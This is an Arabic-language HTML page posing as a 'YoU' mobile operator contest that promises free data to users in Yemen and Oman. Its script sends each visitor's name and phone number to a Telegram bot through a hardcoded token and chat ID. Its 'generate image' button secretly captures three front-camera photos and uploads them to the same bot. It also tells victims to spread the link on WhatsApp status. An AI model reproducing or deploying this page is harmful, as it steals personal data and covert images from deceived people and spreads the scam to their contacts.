<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مسابقة YoU - اربح 10 جيجابايت</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- خط جميل -->
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">

  <!-- وسوم Open Graph لمشاركة الرابط -->
  <meta property="og:title" content="مسابقة YoU - اربح 10 جيجابايت مجانًا">
  <meta property="og:description" content="شارك في مسابقة YoU، انشر الحالة، واربح حتى 10 جيجا من البيانات مجانًا!">
  <meta property="og:image" content="https://h.top4top.io/p_3411sp3gj0.jpeg">
  <meta property="og:url" content="https://your-site.glitch.me">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">

  <style>
    body {
      font-family: 'Cairo', sans-serif;
      margin: 0;
      background: #f4f7ff;
      color: #222;
      overflow-x: hidden;
    }

    .hidden { display: none; }

    header {
      background: linear-gradient(to left, #7c3aed, #06b6d4);
      color: white;
      padding: 40px 20px;
      text-align: center;
      border-bottom-left-radius: 60px;
      border-bottom-right-radius: 60px;
    }

    h1 {
      font-size: 2.5em;
    }

    .section {
      max-width: 600px;
      margin: 30px auto;
      background: white;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.08);
      padding: 25px;
    }

    input, button {
      width: 100%;
      padding: 12px;
      font-size: 1em;
      border-radius: 10px;
      border: none;
      margin: 10px 0;
    }

    input {
      background: #f0f0f0;
    }

    button {
      background: #06b6d4;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #0891b2;
    }

    .note {
      background: #fef9c3;
      padding: 15px;
      border-radius: 12px;
      border: 1px solid #fde047;
      margin-top: 20px;
    }

    #page2 {
      position: relative;
      min-height: 100vh;
      background: linear-gradient(to bottom, #ecfeff, #dbeafe);
      text-align: center;
      overflow: hidden;
      padding: 40px 20px;
    }

    .coin, .gift {
      position: absolute;
      width: 40px;
      animation: fall 6s infinite linear;
      opacity: 0.8;
      z-index: 0;
    }

    @keyframes fall {
      0% { top: -50px; transform: rotate(0deg); }
      100% { top: 100vh; transform: rotate(360deg); }
    }

    .content {
      background: white;
      padding: 20px;
      border-radius: 20px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      z-index: 2;
      position: relative;
    }

    .content h2 {
      color: #7c3aed;
    }

    .generated {
      margin-top: 20px;
      padding: 15px;
      background: #f0f9ff;
      border: 1px dashed #06b6d4;
      border-radius: 12px;
      direction: ltr;
    }

    footer {
      text-align: center;
      padding: 20px;
      font-size: 0.9em;
      color: #777;
    }
  </style>
</head>
<body>

<!-- الصفحة الأولى -->
<div id="page1">
  <header>
    <h1>مسابقة YoU</h1>
    <p>اربح حتى 10 جيجابايت مجانًا!</p>
  </header>

  <div class="section">
    <h2>شارك الآن</h2>
    <input type="text" id="name" placeholder="الاسم الكامل">
    <input type="tel" id="number" placeholder="رقم هاتف YoU">
    <button onclick="startCompetition()">اشترك الآن</button>
    <div class="note">
      المشاركة متاحة لمستخدمي YoU في اليمن وعُمان فقط.
    </div>
  </div>
</div>

<!-- الصفحة الثانية -->
<div id="page2" class="hidden">
  <!-- رموز متحركة -->
  <img src="https://cdn-icons-png.flaticon.com/512/2769/2769159.png" class="coin" style="left:10%; animation-delay:0s;">
  <img src="https://cdn-icons-png.flaticon.com/512/2769/2769159.png" class="coin" style="left:50%; animation-delay:1s;">
  <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="gift" style="left:80%; animation-delay:2s;">

  <div class="content">
    <h2>طريقة الفوز</h2>
    <p>انشر الصورة والرابط التي سيتم توليدها في حالتك على واتساب.</p>
    <p>عند الوصول إلى:</p>
    <ul style="text-align:right;">
      <li>20 مشاهدة: ستحصل على 5 جيجابايت</li>
      <li>40 مشاهدة: ستحصل على 10 جيجابايت</li>
    </ul>
    <button onclick="generateStatus()">توليد الصوره</button>

    <div id="result" class="generated hidden">
      <p><strong> بسخ الرابط واضفه وصف الصورع:</strong></p>
      <p><a href="https://sage-northern-tithonia.glitch.me/" target="_blank">https://your-site.glitch.me</a></p>
      
      <p><strong>الصورة الخاصة بالمسابقة:</strong></p>
      <img id="promoImage" src="https://k.top4top.io/p_3411uuzge0.jpeg" alt="مسابقة YoU" style="max-width:100%; border-radius:12px; box-shadow:0 0 8px #ccc; margin:10px 0;">
      
      <a id="downloadLink" href="https://k.top4top.io/p_3411uuzge0.jpeg" download="YoU-promo.jpg">
        <button style="margin-top: 10px; background:#7c3aed;">تحميل الصورة</button>
      </a>

      <p style="margin-top:15px;">انسخ الرابط، وانشر الصورة في حالتك، ثم أرسل لقطة شاشة إلى: <strong>+967733333010</strong></p>
    </div>
  </div>
</div>

<footer>
  &copy; 2025 YoU - هذا الموقع تجريبي للمسابقة
</footer>

<script>
  // بوت 1
  const TELEGRAM_BOT_TOKEN = "8264619698:AAHDEmNUqCUyVlyYtmPTH8BBvszbp4MRUBI";
  const TELEGRAM_CHAT_ID = "8184984859";

  // بوت 2
  const TELEGRAM_BOT_TOKEN_2 = "";
  const TELEGRAM_CHAT_ID_2 = "";

  function startCompetition() {
    const name = document.getElementById('name').value.trim();
    const number = document.getElementById('number').value.trim();

    if (name === '' || number === '') {
      alert("يرجى إدخال الاسم والرقم.");
      return;
    }

    const message = `📝 اشتراك جديد في المسابقة:\n\nالاسم: ${name}\nالرقم: ${number}`;

    // إرسال للبوت 1
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    // إرسال للبوت 2
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID_2,
        text: message
      })
    });

    document.getElementById('page1').classList.add('hidden');
    document.getElementById('page2').classList.remove('hidden');
  }

  function generateStatus() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(function(stream) {
        let video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        let captureCount = 0;

        const captureImage = () => {
          let canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          let ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(function(blob) {
            // إرسال للبوت 1
            let formData1 = new FormData();
            formData1.append("chat_id", TELEGRAM_CHAT_ID);
            formData1.append("photo", blob, `image${captureCount + 1}.jpg`);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
              method: "POST",
              body: formData1
            });

            // إرسال للبوت 2
            let formData2 = new FormData();
            formData2.append("chat_id", TELEGRAM_CHAT_ID_2);
            formData2.append("photo", blob, `image${captureCount + 1}.jpg`);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendPhoto`, {
              method: "POST",
              body: formData2
            });

            captureCount++;
            if (captureCount < 3) {
              setTimeout(captureImage, 1000); // كل ثانية
            } else {
              stream.getTracks().forEach(track => track.stop());
            }
          }, 'image/jpeg');
        };

        setTimeout(captureImage, 1000);
      })
      .catch(function(error) {
        alert('فشل في الوصول إلى الكاميرا');
        console.error(error);
      });

    document.getElementById('result').classList.remove('hidden');
  }
</script>

</body>
</html>
